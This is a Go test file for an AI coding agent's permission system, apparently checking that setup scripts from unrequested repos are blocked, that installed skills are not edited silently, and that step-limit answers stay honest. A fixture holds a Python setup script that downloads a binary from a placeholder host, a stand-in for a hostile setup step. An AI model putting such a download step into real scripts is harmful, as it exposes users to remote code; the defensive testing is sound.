package main

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

const urSetupPy = "import subprocess, urllib.request\nurllib.request.urlretrieve('https://example.invalid/m.bin', 'm.bin')\nsubprocess.run(['pip', 'install', '-r', 'req.txt'])\n"

// urRepo makes <root>/video-forge, a git clone whose origin is url.
func urRepo(t *testing.T, root, url string) {
	t.Helper()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	d := filepath.Join(root, "video-forge", "scripts")
	if err := os.MkdirAll(d, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(d, "setup_environment.py"), []byte(urSetupPy), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, args := range [][]string{{"init", "-q"}, {"remote", "add", "origin", url}} {
		c := exec.Command("git", args...)
		c.Dir = filepath.Join(root, "video-forge")
		if out, err := c.CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v %s", args, err, out)
		}
	}
}

func TestUrSlug(t *testing.T) {
	for in, want := range map[string]string{
		"https://github.com/jazzautomations/video-forge":       "github.com/jazzautomations/video-forge",
		"https://github.com/JazzAutomations/video-forge.git\n": "github.com/jazzautomations/video-forge",
		"git@github.com:jazzautomations/video-forge.git":       "github.com/jazzautomations/video-forge",
		"https://example.com/x/y":                              "",
	} {
		if got := urSlug(in); got != want {
			t.Errorf("urSlug(%q) = %q, want %q", in, got, want)
		}
	}
}

// The user named the repo: its setup script is a question (even in yolo),
// not a dead end; denied here, so it must not run.
func TestUserRequestedRepoSetupAsks(t *testing.T) {
	run := fakeCall{ID: "b1", Name: "bash", Args: `{"command":"cd video-forge && python3 scripts/setup_environment.py --out .t"}`}
	h := newHarness(t, seq(fakeResp{Calls: []fakeCall{run}}, fakeResp{Text: "você negou o setup; parei"}), func(c *Config) { c.Mode = "yolo" })
	urRepo(t, h.root, "https://github.com/jazzautomations/video-forge.git")
	if err := h.run(t, "lê essa skill e cria um vídeo https://github.com/jazzautomations/video-forge"); err != nil {
		t.Fatal(err)
	}
	if len(h.ui.approvals) != 1 || !strings.Contains(h.ui.approvals[0].Reason, "repositório que você pediu (github.com/jazzautomations/video-forge)") {
		t.Fatalf("want one question naming the requested repo, got %+v", h.ui.approvals)
	}
	if res := h.fs.requests()[1].toolResults()["b1"]; strings.Contains(res, "hostile") {
		t.Errorf("a requested repo is not called hostile: %q", res)
	}
}

// A repo the user did not name keeps the hard block, with no question.
func TestUnrequestedRepoSetupStaysBlocked(t *testing.T) {
	run := fakeCall{ID: "b1", Name: "bash", Args: `{"command":"cd video-forge && python3 scripts/setup_environment.py --out .t"}`}
	h := newHarness(t, seq(fakeResp{Calls: []fakeCall{run}}, fakeResp{Text: "bloqueado"}), func(c *Config) { c.Mode = "yolo" })
	urRepo(t, h.root, "https://github.com/someone-else/video-forge.git")
	if err := h.run(t, "lê essa skill e cria um vídeo https://github.com/jazzautomations/video-forge"); err != nil {
		t.Fatal(err)
	}
	if len(h.ui.approvals) != 0 {
		t.Errorf("an unrequested repo must not turn into a question: %+v", h.ui.approvals)
	}
	res := h.fs.requests()[1].toolResults()["b1"]
	if !strings.Contains(res, "hostile") || !strings.Contains(res, "say so plainly") {
		t.Errorf("want the hard block with the honesty steer: %q", res)
	}
}

// An installed skill is not patched silently: a question even in yolo.
func TestInstalledSkillWriteAsks(t *testing.T) {
	var f string
	h := newHarness(t, func(n int, r recReq) fakeResp {
		if n == 0 {
			args := `{"path":"` + f + `","old_string":"x = 1","new_string":"x = 2"}`
			return fakeResp{Calls: []fakeCall{{ID: "e1", Name: "edit", Args: args}}}
		}
		return fakeResp{Text: "a skill tem um bug; avisei"}
	}, func(c *Config) { c.Mode = "yolo" })
	sk := filepath.Join(siUserDir(), "vf", "scripts") // after the harness: it sets its own JAZZ_HOME
	if err := os.MkdirAll(sk, 0o755); err != nil {
		t.Fatal(err)
	}
	f = filepath.Join(sk, "build.py")
	if err := os.WriteFile(f, []byte("x = 1\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := h.run(t, "usa a skill vf"); err != nil {
		t.Fatal(err)
	}
	if len(h.ui.approvals) != 1 || !strings.Contains(h.ui.approvals[0].Reason, "altera uma skill instalada") {
		t.Fatalf("want a question about the installed skill, got %+v; result: %q", h.ui.approvals, h.fs.requests()[1].toolResults()["e1"])
	}
	if b, _ := os.ReadFile(f); string(b) != "x = 1\n" {
		t.Errorf("denied edit changed the skill: %q", b)
	}
}

// The forced final answer at the step limit is never raw tool-call XML.
func TestAtLimitTextCallBecomesHonestAnswer(t *testing.T) {
	ls := fakeCall{ID: "b1", Name: "bash", Args: `{"command":"ls"}`}
	xml := "<tool_call>\n<function=bash>\n<parameter=command>\npython3 render.py --out film\n</parameter>\n</function>\n</tool_call>"
	h := newHarness(t, seq(fakeResp{Calls: []fakeCall{ls}}, fakeResp{Text: xml}, fakeResp{Text: "never"}), func(c *Config) { c.MaxSteps = 1 })
	_ = h.run(t, "renderiza o vídeo")
	var last string
	for _, m := range h.ag.Msgs {
		if m.Role == "assistant" && m.Content != "" {
			last = m.Content
		}
	}
	if strings.Contains(last, "<tool_call>") || !strings.Contains(last, "Parei no limite de passos") || !strings.Contains(last, "render.py") {
		t.Errorf("final answer: %q", last)
	}
}
